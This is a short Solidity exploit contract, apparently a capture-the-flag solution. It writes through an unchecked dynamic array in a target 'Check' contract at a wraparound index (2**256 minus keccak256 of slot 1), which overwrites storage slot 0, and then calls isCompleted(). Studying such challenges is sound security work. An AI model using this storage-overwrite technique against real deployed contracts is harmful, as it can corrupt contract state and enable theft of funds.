// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;
import "./1.sol";
contract Attract{
    Check check;
    constructor(Check addr)public{
        check = addr;
        check.map().set(getOverUint(uint256(getindex(1))), 1);
    }
    function getindex(uint256 slot) public pure returns(bytes32){
        return keccak256(bytes32(slot));
    }
    function getOverUint(uint256 solt) public pure returns(uint256){
        return 2**256 - 1 - solt + 1;
    }
    function attract() public {
        check.isCompleted();
    }
}